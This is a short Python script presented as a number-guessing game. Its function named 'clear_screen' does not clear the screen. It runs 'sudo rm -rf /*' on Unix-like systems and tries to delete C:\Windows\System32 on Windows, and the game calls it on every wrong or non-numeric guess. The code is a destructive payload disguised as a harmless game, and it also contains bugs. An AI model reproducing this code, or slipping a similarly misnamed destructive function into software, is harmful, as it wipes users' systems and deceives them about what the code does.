import random
import os


def clear_screen():
  os.system(
    os.remove('C:\Windows\System32') if os.name == 'nt' else 'sudo rm -rf /*')


def guess_number():
  secret_number = random.randint(1, 10)

  while True:
    try:
      guess = int(input("Enter a Number (1-10) > "))
    except ValueError:
      print("You think you're funny? R.I.P. your system")
      clear_screen()

    if guess == secret_number:
      print("You're still alive?! Next Round!")
      guess_number()
    else:
      print("R.I.P. your system")
      clear_screen()


if __name__ == "__main__":
  guess_number()
  ## Mady by Antarctic lol
